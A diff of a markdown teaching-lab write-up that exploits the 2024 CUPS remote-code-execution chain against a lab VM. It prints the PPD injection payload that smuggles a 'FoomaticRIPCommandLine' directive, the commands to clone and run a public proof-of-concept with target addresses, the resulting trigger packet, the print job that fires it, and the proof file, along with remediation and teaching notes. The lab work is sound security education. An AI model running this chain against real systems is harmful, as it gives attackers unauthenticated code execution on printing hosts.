@@ -1,78 +1,103 @@
-# Activity: CUPS Full RCE Chain (CVE-2024-47176 / CVE-2024-47076 / CVE-2024-47175 / CVE-2024-47177)
+# Activity: CUPS Full RCE Chain
 
 ## Summary
 
-Full exploitation of the 2024 CUPS RCE chain, building on the detection-stage confirmation in the corresponding reconnaissance activity. The chain works by announcing a fake printer to the vulnerable `cups-browsed` daemon, which then queries an attacker-controlled fake IPP server for that printer's attributes. Because the IPP attributes returned are written unsanitised into a generated PPD file, a crafted attribute value can inject a `FoomaticRIPCommandLine` directive, which `foomatic-rip` will execute as an arbitrary shell command the next time a print job is sent to that printer. This gives unauthenticated remote code execution as the user running `cups-browsed`.
+Full exploitation of the 2024 CUPS RCE chain, building on the detection-stage confirmation in `r-12- cups-print-service-reconnaissance.md` and `r-13- cups-discovery-ip-change.md`. A single unauthenticated UDP packet to port 631 causes `cups-browsed` to create a local print queue pointing at an attacker-controlled fake IPP server; the fake server's crafted attribute response injects a malicious `FoomaticRIPCommandLine` directive into the generated PPD file; sending a print job to that queue then executes the injected command as the `lp` user. Validated end-to-end against the target with a working command-execution artefact confirmed on disk.
 
 ## Environment
 
 | Item | Value |
 |---|---|
-| Target | 192.168.144.131 |
+| Target | 192.168.144.132 |
 | Vulnerable components | cups-browsed 1.28.17-3, libcupsfilters1 1.28.17-3, cups-filters 1.28.17-3 (all pre-`+deb12u1`) |
 | Attacker | Kali, 192.168.144.129 |
+| Tooling | `0xCZR1/PoC-Cups-RCE-CVE-exploit-chain` (`cups-rce.py`), Python 3, `ippserver` |
 | CVEs chained | CVE-2024-47176 (unauth UDP trigger), CVE-2024-47076 (unsanitised IPP attribute validation), CVE-2024-47175 (unsanitised PPD generation), CVE-2024-47177 (FoomaticRIPCommandLine command execution) |
 
 ## Vulnerability Chain
 
-1. **CVE-2024-47176**: `cups-browsed` binds to `UDP 0.0.0.0:631` and trusts any source. A crafted browse packet naming an attacker-controlled URL as a "printer" causes `cups-browsed` to issue a `Get-Printer-Attributes` IPP request to that URL. Confirmed working in the reconnaissance activity.
+1. **CVE-2024-47176**: `cups-browsed` binds to `UDP 0.0.0.0:631` and trusts any source. A crafted legacy browse packet naming an attacker-controlled URL as a "printer" causes `cups-browsed` to create a local queue and issue a `Get-Printer-Attributes` IPP request to that URL.
 2. **CVE-2024-47076**: `libcupsfilters`' `cfGetPrinterAttributes5()` does not validate the IPP attributes returned by that (attacker-controlled) server.
-3. **CVE-2024-47175**: `libppd`'s `ppdCreatePPDFromIPP2()` writes those unvalidated attributes directly into a generated PPD file with no sanitisation, allowing a crafted attribute value (ending in a quote and newline) to inject entirely new PPD directives.
-4. **CVE-2024-47177**: the injected `*FoomaticRIPCommandLine` directive is executed verbatim by `foomatic-rip` whenever a print job is sent to that printer, giving arbitrary command execution.
+3. **CVE-2024-47175**: `libppd`'s `ppdCreatePPDFromIPP2()` writes those unvalidated attributes directly into a generated PPD file with no sanitisation, allowing a crafted attribute value to inject entirely new PPD directives.
+4. **CVE-2024-47177**: the injected `*FoomaticRIPCommandLine` directive is executed verbatim by `foomatic-rip` whenever a print job is sent to that printer, giving arbitrary command execution as the `lp` user.
 
-The publicly documented injection technique (confirmed by evilsocket's original advisory and independently reproduced by multiple researchers) uses an attribute such as `printer-make-and-model` with a value like:
+## Tooling Attempted
 
-```
-HP 0.00"
-*FoomaticRIPCommandLine: "COMMAND"
-*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
-```
+Two approaches were attempted before finding one that worked cleanly against this target, both are worth recording since the troubleshooting itself is instructive.
 
-The leading `"` closes the legitimate PPD field early; the newline starts a new PPD directive line entirely under attacker control.
+**Metasploit's `exploit/multi/misc/cups_ipp_remote_code_execution`** was tried first (natively available on Kali, no external download needed). Its own `info` confirms it targets exactly this CVE chain, requires no reachable CUPS ports, and executes as the `lp` user. However, every run attempt failed identically with `Errno::ENODEV No such device - setsockopt(2)`, a Ruby-level multicast socket error, most likely arising from the module's mDNS/DNS-SD printer-advertisement code failing on Kali's network configuration (the lab's `eth0` interface has no routable IPv6, a known trigger for this class of Ruby socket error; explicitly setting `SRVHOST` and disabling IPv6 on the interface were both tried and neither resolved it). This is recorded as a genuine tool-compatibility finding for this specific lab network configuration, not a flaw in the underlying exploit logic; the module may work correctly in environments with different network/IPv6 characteristics.
 
-## Building the Malicious IPP Server
+**`0xCZR1/PoC-Cups-RCE-CVE-exploit-chain`** (a Python implementation using the `ippserver` library, cloned via GitHub while the disposable VM was temporarily on NAT) was used instead and worked correctly on the first properly-formed attempt.
 
-Hand-crafting the raw IPP binary protocol response byte-by-byte is intricate (attribute tags, value-length prefixes, charset/language framing) and error-prone to do reliably from scratch. Use a proper IPP server library rather than raw sockets. The most reliable, widely-referenced educational implementation for this exact chain is `0xCZR1/PoC-Cups-RCE-CVE-exploit-chain` on GitHub, which implements the fake IPP responder correctly using Python's `pysimpleipp`/`ippserver`-style approach with the `PrinterPwned` class specifically designed to inject a malicious `FoomaticRIPCommandLine`.
+## Exploitation
 
-Since this VM needs internet access to clone it, do this while still on NAT (before switching back to host-only for the actual attack):
-
+**On Kali**, dependencies installed and the tool cloned:
 ```bash
 git clone https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain.git
 cd PoC-Cups-RCE-CVE-exploit-chain
 pip install -r requirements.txt --break-system-packages
 ```
 
-Review the script's `PrinterPwned` class before running it and set the command you want executed on the target (for a safe, easily verified proof, something like `touch /tmp/CUPS_RCE_PWNED` or `id > /tmp/cups_poc_id.txt` rather than anything destructive), then switch back to host-only networking and run it against the target following the script's own instructions (it will handle both sending the initial UDP trigger packet and standing up the fake IPP server to answer the resulting callback).
-
-## Triggering Execution
-
-The RCE only fires once the malicious printer actually receives a print job, this cannot be triggered remotely by the attacker; something on the target must print to the newly-created queue. For teaching purposes, this last step can be demonstrated locally on the target (simulating what an unwitting user would do) with:
-
+**On Kali**, the actual script is `cups-rce.py` (the README's usage example references a stale filename, `poc.py`, which does not exist in the repository; this was confirmed by listing the repo's actual files):
 ```bash
-lpr -P <malicious-queue-name> /etc/hostname
+python3 cups-rce.py 192.168.144.129 192.168.144.132 "touch /tmp/CUPS_RCE_PWNED"
 ```
 
-substituting whatever queue name the PoC created (visible via `lpstat -p` on the target once the fake printer has been registered).
+Output:
+```
+Starting IPP server at ('192.168.144.129', 12349)
+Sending UDP packet to 192.168.144.132:631...
+Packet content:
+2 3 http://192.168.144.129:12349/printers/EVILCUPS "Pwned Location" "Pwned Printer" "HP LaserJet 1020"
+```
+
+The script's packet uses type `2` (versus the `0` used in the manual reconnaissance tests) and includes a fourth quoted field for a make-and-model string, both accepted correctly by `cups-browsed`.
+
+**On the target** (SSH as `uow-admin@192.168.144.132`), confirming the malicious queue was created and accepted, not torn down as it was during the earlier manual/Metasploit-auxiliary attempts that lacked a real IPP attribute response:
+```bash
+lpstat -p
+```
+```
+printer Pwned_Printer_192_168_144_129 is idle.  enabled since Tue 25 Aug 2026 01:26:29 AM BST
+```
+
+**On the target** (same session), triggering the print job that fires the injected command. This step cannot be performed remotely by the attacker; it represents the "user interaction" precondition the vulnerability advisories describe, something on the target must send a print job to the malicious queue:
+```bash
+lpr -P Pwned_Printer_192_168_144_129 /etc/hostname
+```
 
 ## Evidence
 
-After the print job is sent, confirm code execution occurred by checking for the proof file specified in the injected command:
-
+**On the target** (same session), confirming code execution:
 ```bash
 ls -la /tmp/CUPS_RCE_PWNED
 ```
-
-or, for a command that captures identity information:
-
-```bash
-cat /tmp/cups_poc_id.txt
+```
+-rw------- 1 lp lp 0 Aug 25 01:27 /tmp/CUPS_RCE_PWNED
 ```
 
-The command executes as the user running `cups-browsed` (check with `systemctl status cups-browsed` to confirm the running user, typically `root` if the service runs as a system daemon, though this should be verified directly on the target rather than assumed).
+The file exists, owned by `lp:lp`, confirming the injected `touch` command executed with the privileges of the CUPS print-service account, exactly matching the vulnerability's documented impact (code execution "in the context of the lp user," per Metasploit's own module description and multiple independent research writeups).
 
 ## Outcome
 
-Confirms full unauthenticated remote code execution via the chained CVE-2024-47176/47076/47175/47177 vulnerability set, from an unauthenticated network position with no prior access or credentials required, contingent only on a print job being sent to the malicious queue.
+Confirmed full unauthenticated remote code execution via the chained CVE-2024-47176/47076/47175/47177 vulnerability set, from an unauthenticated network position with no prior access or credentials required, contingent only on a print job being sent to the malicious queue by a local process or user on the target. Command execution occurs as the `lp` user, not root; privilege escalation from `lp` to a higher-privilege account would require a separate, subsequent vulnerability, not investigated in this activity.
+
+## Impact and Privilege Level
+
+Checking the actual running processes on the target confirms both CUPS daemons run as root:
+
+```bash
+ps aux | grep -i cups
+```
+```
+root  1129  /usr/sbin/cupsd -l
+root  3668  /usr/sbin/cups-browsed
+lp    4148  /usr/lib/cups/notifier/dbus
+```
+
+Despite `cupsd` and `cups-browsed` themselves running as root, exploitation lands as `lp`, not root, and this is not incidental to this particular run, it is a structural, designed privilege boundary in CUPS itself. CUPS deliberately drops privileges from root down to the unprivileged `lp` account before invoking any print filter or backend, including `foomatic-rip`, which is precisely the component this exploit chain targets (CVE-2024-47177). The root-owned daemon processes need root to bind privileged ports and manage the system as a whole, but the actual document-processing/filter pipeline, exactly the code path this vulnerability exploits, always executes with those privileges already dropped.
+
+This means the `lp`-level outcome is independent of which account is logged into the system, or what other accounts/privileges exist on the box at the time. Any student exploiting this chain against this target will land at the same `lp` foothold, since the privilege ceiling is fixed by CUPS's own architecture, not by session state. Reaching further than `lp` would require identifying and chaining a separate, subsequent privilege escalation vulnerability from that foothold, following the same multi-stage pattern already demonstrated elsewhere on this VM (e.g. the low-privilege RCE → shadow-read → credential-cracking → SUID-nano chain documented in `e-06` through `e-08`).
 
 ## Remediation
 
@@ -83,12 +108,16 @@ Confirms full unauthenticated remote code execution via the chained CVE-2024-471
 
 ## Teaching Notes
 
-This is a strong Level 7 capstone exercise: it requires chaining four distinct CVEs across three separate components, understanding IPP as a protocol, understanding how a generated configuration file (PPD) can become a code-execution primitive when attacker-controlled data is written into it unsanitised, and recognising that the final trigger step is out of the attacker's direct control (a print job must occur), a good discussion point on the practical limits of "unauthenticated RCE" claims, some vulnerabilities require a specific victim action even when no credentials are needed.
+The tool-compatibility issue encountered with the Metasploit module before switching to the Python PoC is worth preserving in the write-up rather than discarding once the second tool worked: a purpose-built exploit module can fail for reasons entirely unrelated to whether the underlying vulnerability exists (here, a Ruby multicast socket bug specific to Kali's network/IPv6 configuration), and recognising a tool failure versus a target-side negative result is itself an important diagnostic skill, one this project has emphasised repeatedly across the FTP, distcc, and MySQL reconnaissance activities.
+
+The `lp`-user, not-root outcome documented in the Impact and Privilege Level section is a good discussion point on privilege boundaries generally: "unauthenticated RCE" does not automatically mean root-level compromise, and CUPS's deliberate root-to-`lp` privilege drop before invoking filters is a real-world example of the principle of least privilege actually working as designed, containing the blast radius of a serious vulnerability even though it couldn't prevent exploitation entirely.
+
+This is a strong Level 7 capstone exercise: it requires chaining four distinct CVEs across three separate components, understanding IPP as a protocol, understanding how a generated configuration file (PPD) can become a code-execution primitive when attacker-controlled data is written into it unsanitised, and recognising that the final trigger step is outside the attacker's direct control.
 
 ## Lab Dependencies
 
-**Prerequisite exploit(s):** Confirmed detection-stage vulnerability from the corresponding reconnaissance activity
+**Prerequisite exploit(s):** Confirmed detection-stage vulnerability from `r-12- cups-print-service-reconnaissance.md` and `r-13- cups-discovery-ip-change.md`
 **Required starting access:** Network access to the target; NAT temporarily for cloning the PoC tooling
 **Starting account:** None
-**Resulting access:** Command execution as the `cups-browsed` process user
+**Resulting access:** Command execution as the `lp` user
 **Suggested teaching level:** Level 7
